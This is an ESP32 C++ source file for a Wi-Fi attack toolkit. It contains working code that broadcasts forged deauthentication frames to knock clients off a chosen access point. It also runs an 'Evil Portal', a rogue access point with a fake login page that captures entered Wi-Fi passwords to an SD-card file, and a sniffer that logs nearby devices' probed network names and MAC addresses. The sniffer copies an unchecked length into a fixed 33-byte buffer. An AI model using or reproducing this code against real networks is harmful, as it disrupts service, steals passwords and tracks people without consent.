#include "WiFiPentest.h"
#include <esp_wifi.h>
#include <SD.h>

// Global pointer for callback
WiFiPentest* globalPentest = nullptr;

WiFiPentest::WiFiPentest() {
    isScanning = false;
    serverRunning = false;
    deauthRunning = false;
    portalRunning = false;
    karmaRunning = false;
    webServer = nullptr;
    globalPentest = this;
}

WiFiPentest::~WiFiPentest() {
    stopDeauth();
    stopEvilPortal();
    stopKarma();
}

void WiFiPentest::scanNetworks() {
    scanResults.clear();
    WiFi.mode(WIFI_STA);
    delay(100); // Allow mode switch to settle
    WiFi.disconnect();
    
    int n = WiFi.scanNetworks();
    for (int i = 0; i < n; ++i) {
        APInfo info;
        info.ssid = WiFi.SSID(i);
        memcpy(info.bssid, WiFi.BSSID(i), 6);
        info.rssi = WiFi.RSSI(i);
        info.channel = WiFi.channel(i);
        info.encrypted = (WiFi.encryptionType(i) != WIFI_AUTH_OPEN);
        scanResults.push_back(info);
    }
}

std::vector<APInfo> WiFiPentest::getResults() {
    return scanResults;
}

// Deauthentication Attack
void WiFiPentest::startDeauth(uint8_t* bssid, uint8_t channel) {
    if (deauthRunning) return;
    
    memcpy(targetBSSID, bssid, 6);
    targetChannel = channel;
    
    WiFi.mode(WIFI_STA);
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_channel(targetChannel, WIFI_SECOND_CHAN_NONE);
    
    deauthRunning = true;
    Serial.println("Deauth started on channel " + String(targetChannel));
}

void WiFiPentest::stopDeauth() {
    if (!deauthRunning) return;
    
    deauthRunning = false;
    esp_wifi_set_promiscuous(false);
    WiFi.mode(WIFI_OFF);
    Serial.println("Deauth stopped");
}

void WiFiPentest::updateDeauth() {
    if (!deauthRunning) return;
    
    // Construct Deauth Frame
    uint8_t packet[26] = {
        0xC0, 0x00, // Frame Control: Deauth
        0x3A, 0x01, // Duration
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination: Broadcast
        targetBSSID[0], targetBSSID[1], targetBSSID[2], targetBSSID[3], targetBSSID[4], targetBSSID[5], // Source: Target AP
        targetBSSID[0], targetBSSID[1], targetBSSID[2], targetBSSID[3], targetBSSID[4], targetBSSID[5], // BSSID
        0x00, 0x00, // Sequence
        0x07, 0x00 // Reason: Class 3 frame received from nonassociated STA
    };
    
    // Send burst
    for(int i=0; i<3; i++) {
        esp_wifi_80211_tx(WIFI_IF_STA, packet, sizeof(packet), false);
        delay(10);
    }
}

// Evil Portal
const char* DEFAULT_HTML_PORTAL = R"(
<!DOCTYPE html><html><head><meta name="viewport" content="width=device-width,initial-scale=1"><title>Login</title></head>
<body><h1>WiFi Login</h1><form action="/login" method="POST"><input type="password" name="password" placeholder="Password"><br><br><input type="submit" value="Connect"></form></body></html>
)";

String currentPortalHTML = "";

void WiFiPentest::startEvilPortal(String ssid, String htmlContent) {
    if (portalRunning) return;
    
    if (htmlContent.length() > 0) {
        currentPortalHTML = htmlContent;
    } else {
        currentPortalHTML = String(DEFAULT_HTML_PORTAL);
    }
    
    WiFi.mode(WIFI_AP);
    WiFi.softAP(ssid.c_str());
    
    // Setup DNS Server to redirect all traffic
    dnsServer.start(53, "*", WiFi.softAPIP());
    
    // Setup Web Server
    webServer = new WebServer(80);
    
    // Handler for the login action
    webServer->on("/login", HTTP_POST, [this]() {
        if (webServer->hasArg("password")) {
            String creds = "SSID: " + WiFi.softAPSSID() + " | PASS: " + webServer->arg("password");
            Serial.println("CAPTURED: " + creds);
            saveCredential(creds);
            webServer->send(200, "text/plain", "Error: Connection Failed. Please try again.");
        } else {
            webServer->send(200, "text/html", currentPortalHTML);
        }
    });

    // Catch-all handler for captive portal redirection
    webServer->onNotFound([this]() {
        webServer->send(200, "text/html", currentPortalHTML);
    });
    
    webServer->begin();
    portalRunning = true;
    Serial.println("Evil Portal Started: " + ssid);
}

void WiFiPentest::stopEvilPortal() {
    if (!portalRunning) return;
    
    dnsServer.stop();
    if (webServer) {
        webServer->stop();
        delete webServer;
        webServer = nullptr;
    }
    WiFi.softAPdisconnect(true);
    WiFi.mode(WIFI_OFF);
    portalRunning = false;
    Serial.println("Evil Portal Stopped");
}

void WiFiPentest::handlePortal() {
    if (!portalRunning) return;
    dnsServer.processNextRequest();
    if (webServer) webServer->handleClient();
}

void WiFiPentest::saveCredential(String creds) {
    File file = SD.open("/creds.txt", FILE_APPEND);
    if (file) {
        file.println(creds);
        file.close();
    } else {
        Serial.println("Failed to open creds.txt");
    }
}

// Karma Attack (Passive Probe Logging)
void WiFiPentest::startKarma() {
    if (karmaRunning) return;

    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_rx_cb(snifferCallback);
    
    karmaRunning = true;
    Serial.println("Karma/Probe Sniffer Started");
}

void WiFiPentest::stopKarma() {
    if (!karmaRunning) return;
    
    esp_wifi_set_promiscuous(false);
    esp_wifi_set_promiscuous_rx_cb(NULL);
    WiFi.mode(WIFI_OFF);
    
    karmaRunning = false;
    Serial.println("Karma Stopped");
}

// Sniffer Callback for Karma
void WiFiPentest::snifferCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
    if (type != WIFI_PKT_MGMT) return;
    
    wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
    uint8_t* data = pkt->payload;
    
    if (data[0] == 0x40) { // Probe Request
        int pos = 24;
        while (pos < pkt->rx_ctrl.sig_len - 4) {
            uint8_t tag = data[pos];
            uint8_t len = data[pos+1];
            
            if (tag == 0) { // SSID Tag
                if (len > 0) {
                    char ssid[33];
                    memset(ssid, 0, 33);
                    memcpy(ssid, &data[pos+2], len);
                    
                    Serial.printf("PROBE:%s:%02X:%02X:%02X:%02X:%02X:%02X\n", 
                        ssid, 
                        data[10], data[11], data[12], data[13], data[14], data[15]);
                }
                break; 
            }
            pos += 2 + len;
        }
    }
}
